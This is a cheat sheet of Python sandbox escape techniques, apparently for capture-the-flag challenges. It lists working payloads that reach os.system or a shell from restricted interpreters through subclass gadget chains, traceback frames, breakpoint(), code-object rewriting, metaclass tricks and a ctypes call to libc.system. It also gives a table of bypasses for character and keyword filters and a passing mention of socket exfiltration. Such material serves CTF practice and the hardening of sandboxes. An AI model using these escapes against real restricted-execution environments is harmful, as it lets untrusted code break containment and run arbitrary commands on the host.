# Python Jail Escapes

## Constraint Discovery

Always start by probing what's available:

```python
import os                               # ImportError? import blocked
eval("1+1")                             # eval blocked?
exec("print(1)")                        # exec blocked?
__builtins__                            # builtins accessible?
dir(__builtins__)                        # what builtins exist?
type(1)                                 # type() available?
print.__class__                         # attribute access works?
().__class__                            # tuple class accessible?
```

## Subclass Gadget Chain

The most versatile bypass — works even when imports are blocked.

```python
# Step 1: Get all subclasses of object
''.__class__.__mro__[1].__subclasses__()

# Step 2: Find useful subclasses
# os._wrap_close (index varies by Python version)
[i for i, x in enumerate(''.__class__.__mro__[1].__subclasses__())
 if 'wrap_close' in str(x)]

# Step 3: Access os module through the subclass
''.__class__.__mro__[1].__subclasses__()[INDEX].__init__.__globals__['system']('id')

# Alternative: find subprocess.Popen
[x for x in ''.__class__.__mro__[1].__subclasses__() if 'Popen' in str(x)]

# Alternative starting points
().__class__.__bases__[0].__subclasses__()
[].__class__.__mro__[1].__subclasses__()
```

## Filter-Specific Bypasses

| Filter | Bypass |
|---|---|
| `import` keyword | `__import__('os')`, `importlib.import_module('os')` |
| `os` / `sys` string | Subclass chain, string construction with `chr()` |
| `.` (dot) | `getattr(obj, 'attr')`, `obj['attr']` on `__dict__` |
| `_` (underscore) | `chr(95)`, Unicode look-alikes (e.g., `＿`), `vars()` |
| `'` and `"` (quotes) | `chr()` concatenation, `bytes([...]).decode()`, `input()` |
| `[` and `]` (brackets) | `__getitem__`, `tuple()`, `list()` |
| `()` (parens) | Decorators `@`, `__init_subclass__`, class tricks |
| `eval`/`exec` | `compile()` + `exec type`, `__code__` objects |
| Numeric literals | `int(bool(int))` for 1, `len(str(type))` for numbers |
| Length limit | Multi-stage: store partial payload in variable |
| AST filtering | Modify `__code__` objects, use `type()` metaclass |
| Restricted builtins | `__builtins__.__dict__` if dict form exists |

## String Construction Without Quotes

```python
# Using chr()
chr(111)+chr(115)  # → "os"

# Using bytes
bytes([111, 115]).decode()  # → "os"

# From existing strings
str(type(1))[8]  # → 'i' (from "<class 'int'>")
str(True)[0]     # → 'T'
```

## Exception-Based Access

```python
# Access builtins via exception traceback
try:
    1/0
except Exception as e:
    e.__traceback__.tb_frame.f_builtins['__import__']('os').system('id')
```

## breakpoint() (Python 3.7+)

```python
breakpoint()
# Drops into pdb debugger
# Then: import os; os.system('sh')
```

## eval via input()

```python
# If input() is available and eval() is not directly:
eval(input())  # send code via stdin

# Or:
exec(input())
```

## Code Object Manipulation

```python
# Create a function with custom bytecode
import types
code = compile('import os; os.system("id")', '<string>', 'exec')
types.FunctionType(code, {})()

# Or modify an existing function's __code__
def f(): pass
f.__code__ = compile('__import__("os").system("id")', '', 'exec')
f()
```

## Metaclass Tricks (No Parens)

```python
# Using class definition to call functions without ()
class X(metaclass=type('',(),{'__init_subclass__':lambda *a: __import__('os').system('id')})):
    pass
```

## Audit Hook Bypass (Python 3.8+)

```python
# sys.addaudithook blocks certain operations
# Bypass: use ctypes to call C functions directly
import ctypes
libc = ctypes.CDLL("libc.so.6")
libc.system(b"id")
```

## Common Patterns by Challenge Type

| Type | Approach |
|---|---|
| Character blocklist | String construction, Unicode, chr() |
| Function blocklist | Subclass chain, getattr, code objects |
| AST-based filter | Code object manipulation, metaclass |
| Builtins removed | Subclass chain to recover builtins |
| exec/eval/import blocked | `type('',(),{'__init_subclass__':...})` |
| Length-limited | Multi-stage via variables |
| Read-only FS | `sys.stdout.write`, socket to exfiltrate |
